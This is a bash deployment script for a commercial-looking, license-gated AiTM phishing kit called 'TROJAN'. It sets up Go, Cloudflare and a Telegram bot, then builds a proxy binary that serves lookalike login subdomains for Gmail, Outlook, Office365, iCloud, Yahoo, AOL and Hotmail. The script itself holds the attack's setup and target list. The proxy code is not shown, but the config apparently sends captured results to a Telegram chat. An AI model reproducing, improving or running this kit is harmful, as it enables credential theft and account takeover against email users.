#!/bin/bash
# 🏛️ TROJAN - ABSOLUTE STEALTH (V16.5)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗       ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
    echo -e "             ${PURPLE}--- MULTI-TARGET AiTM RESEARCH FRAMEWORK 2026 ---${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
echo -e "${CYAN}[...] Scanning Port 80/443 for Conflicts...${NC}"
sudo fuser -k 80/tcp 443/tcp &> /dev/null
DEPS=(curl dig jq screen ufw git)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done

# --- 2. GOLANG ENGINE INSTALL ---
if ! command -v go &> /dev/null; then
    echo -e "${CYAN}[...] Installing Go 1.22...${NC}"
    wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz &> /dev/null
    sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
fi
export PATH=$PATH:/usr/local/go/bin

# --- 3. MASTER LICENSE GATE ---
MASTER_KEY="TROJAN-PRO-2026"
echo -e "${YELLOW}--------------------------------------------------------${NC}"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }
echo -e "${GREEN}[success] License Verified.${NC}"

# --- 4. VERIFICATIONS (TELEGRAM & CLOUDFLARE) ---
echo -e "${YELLOW}--------------------------------------------------------${NC}"
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Bot Offline or Token Invalid.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID

while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}[error] CF Token Rejected.${NC}"
done

# --- 5. DOMAIN & DNS SETUP ---
VPS_IP=$(curl -s https://api.ipify.org)
echo -e "${YELLOW}--------------------------------------------------------${NC}"
echo -e "${CYAN}VPS IP IDENTIFIED: $VPS_IP${NC}"
while true; do
    read -p "Enter Base Domain (e.g. site.com): " USER_DOMAIN
    DNS_CHECK=$(dig +short $USER_DOMAIN | tail -n1)
    if [[ "$DNS_CHECK" == "$VPS_IP" ]]; then
        echo -e "${GREEN}[success] DNS Propagation Confirmed.${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch ($DNS_CHECK). Point $USER_DOMAIN to $VPS_IP.${NC}"
        read -p "Ignore and continue? (y/n): " CONT
        [[ "$CONT" == "y" ]] && break
    fi
done

# --- 6. TROJAN CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "domain": "$USER_DOMAIN",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "targets": ["gmail", "outlook", "office", "icloud", "yahoo", "aol", "hotmail"]
}
EOF

# --- 7. BUILD BINARY ---
echo -e "${CYAN}[...] Compiling Multi-Target Binary...${NC}"
cd /root/TrojanProject
go mod tidy &> /dev/null
go get github.com/caddyserver/certmagic &> /dev/null
go build -o TrojanTerminal main.go proxy.go targets.go telegram.go gatekeeper.go
chmod +x TrojanTerminal

# --- 8. RUN SCRIPT (GHOST TERMINAL) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(jq -r '.domain' $CONFIG)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}   ${CYAN}TROJAN GHOST TERMINAL${NC}   | ${PURPLE}SSL: AUTO-LE${NC} | ${GREEN}STATUS: ONLINE${NC}       ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Gmail     | https://gmail.$DOMAIN                          ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://outlook.$DOMAIN                        ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Office365 | https://office.$DOMAIN                         ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://icloud.$DOMAIN                         ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://yahoo.$DOMAIN                          ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://aol.$DOMAIN                            ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 07 | Hotmail   | https://hotmail.$DOMAIN                        ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
cd /root/TrojanProject && ./TrojanTerminal
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

echo -e "${GREEN}[success] Trojan Titanium Build Complete.${NC}"
echo -e "${YELLOW}Type 'Run' to start the console.${NC}"
